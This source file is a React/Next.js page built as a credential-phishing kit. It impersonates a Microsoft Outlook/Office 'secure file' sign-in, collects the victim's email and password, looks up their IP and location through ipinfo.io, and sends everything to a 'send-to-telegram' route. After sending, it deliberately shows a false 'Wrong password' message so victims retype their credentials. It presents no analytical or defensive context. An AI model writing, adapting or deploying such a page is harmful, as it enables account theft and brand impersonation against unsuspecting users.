"use client";

import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { Info } from "lucide-react";
import { zodResolver } from "@hookform/resolvers/zod";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import Image from "next/image";
import {
  InputGroup,
  InputGroupAddon,
  InputGroupButton,
  InputGroupInput,
  InputGroupText,
} from "@/components/ui/input-group";
import {
  Tooltip,
  TooltipContent,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import Link from "next/link";

const formSchema = z.object({
  email: z.email("Email is required"),
  password: z.string().min(1, "Password is required"),
});

type FormValues = z.infer<typeof formSchema>;

export default function Home() {
  const [serverError, setServerError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [ip, setIp] = useState<{ country: string; city: string; ip: string }>({
    country: "",
    city: "",
    ip: "",
  });

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors, isSubmitting },
  } = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const onSubmit = async (values: FormValues) => {
    setServerError(null);
    setSuccessMessage(null);

    try {
      const response = await fetch("/api/send-to-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ ...values, ip }),
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => null);
        throw new Error(payload?.error ?? "Failed to send message to Telegram");
      }

      setSuccessMessage("Sent to Telegram!");
      reset();
    } catch (error) {
      if (error instanceof Error) {
        setServerError(error.message);
      } else {
        setServerError("Something went wrong.");
      }
    }
  };

  useEffect(() => {
    const getClientLocation = async () => {
      const res = await fetch("https://ipinfo.io/json");
      const locationData = await res.json();
      setIp(locationData);
    };
    getClientLocation();
  }, [])

  return (
    <div className="flex flex-col min-h-screen items-center justify-center font-sans">
      <header className="mb-7 w-full border-b pb-4 text-center">
        <h2 className="text-[28px] font-semibold text-zinc-800">
          Verify Your Identity
        </h2>
      </header>
      <main className="w-full max-w-sm rounded-2xl bg-white px-6 py-8">
        <section className="mb-5 space-y-1 text-xs text-zinc-500">
          <p className="font-bold text-gray-600 text-[16px]">
            You&apos;ve received a secure file
          </p>

          <div className="flex items-center py-[20px] pl-[20px] gap-2">
            <Image src="/images/pdf.png" width={30} height={30} alt="pdf" />
            <p className="font-semibold">56.1KB</p>
          </div>

          <p className="font-semibold">
            To receive and download this file, enter the email address and
            password associated with the account this document was sent to.
          </p>
        </section>

        <section className="flex items-center justify-center">
          <Image
            src={"/images/outlook.png"}
            width={70}
            height={70}
            alt="outlook"
          />
          <Image
            src={"/images/office.png"}
            width={120}
            height={120}
            alt="office"
          />
        </section>

        <form className="space-y-4 mt-8" onSubmit={handleSubmit(onSubmit)}>
          <div>
            <InputGroup className="h-[50px]">
              <InputGroupInput
                id="email"
                type="email"
                aria-invalid={Boolean(errors.email)}
                {...register("email")}
                placeholder="example.com"
                className="!pl-4 h-[45px]"
              />
              <InputGroupAddon align="inline-end">
                <Tooltip>
                  <TooltipTrigger asChild>
                    <InputGroupButton className="rounded-full" size="icon-xs">
                      <Info size={25} />
                    </InputGroupButton>
                  </TooltipTrigger>
                  <TooltipContent>Enter your email address.</TooltipContent>
                </Tooltip>
              </InputGroupAddon>
            </InputGroup>

            {errors.email?.message ? (
              <p className="mt-1 text-[11px] text-red-500">
                {errors.email.message}
              </p>
            ) : null}
          </div>

          <div>
            <Input
              id="password"
              type="password"
              className="h-[45px]"
              aria-invalid={Boolean(errors.password)}
              {...register("password")}
            />
            {errors.password?.message ? (
              <p className="mt-1 text-[11px] text-red-500">
                {errors.password.message}
              </p>
            ) : null}
          </div>

          {serverError ? (
            <p className="text-xs text-red-500">{serverError}</p>
          ) : null}

          {successMessage ? (
            <div className="py-4 w-full text-center bg-red-100 rounded-sm">
              <p className="text-md font-semibold text-red-700">
                Wrong password! Please try again.
              </p>
            </div>
          ) : null}

          <Button
            type="submit"
            disabled={isSubmitting}
            className="w-full text-[17px]"
          >
            {isSubmitting ? "Signing in..." : "Sign in"}
          </Button>
        </form>

        <footer className="mt-2 text-center">
          <p className="text-[14px] text-zinc-700">
            &copy; {new Date().getFullYear()} Microsoft •{" "}
            <Link
              className="underline cursor-pointer"
              href="https://microsoft.com/privacy"
            >
              Privacy & cookies
            </Link>
          </p>
        </footer>
      </main>
    </div>
  );
}
